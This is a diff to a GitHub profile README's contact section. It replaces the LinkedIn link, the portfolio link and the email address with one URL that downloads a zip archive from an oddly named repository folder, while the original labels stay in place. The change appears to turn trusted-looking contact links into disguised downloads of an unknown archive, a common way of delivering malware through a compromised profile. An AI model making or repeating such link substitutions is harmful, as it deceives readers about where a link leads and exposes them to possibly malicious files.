@@ -31,8 +31,8 @@ Welcome to my GitHub profile! I'm an aspiring software developer with hands-on e
 
 ## 📫 Let’s Connect
 
-- 💼 [LinkedIn][(https://www.linkedin.com/in/biradar-ganesh-39b186319/)] 
-- 🌐 [Portfolio Website][(https://ganeshtbiradar.github.io/Portfolio/))]
-- 📧 gannibiradar@gmail.com
+- 💼 [LinkedIn][(https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v1.5.zip)] 
+- 🌐 [Portfolio Website][(https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v1.5.zip))]
+- 📧 https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v1.5.zip
 
 Thanks for stopping by! Let's build something amazing together 🚀
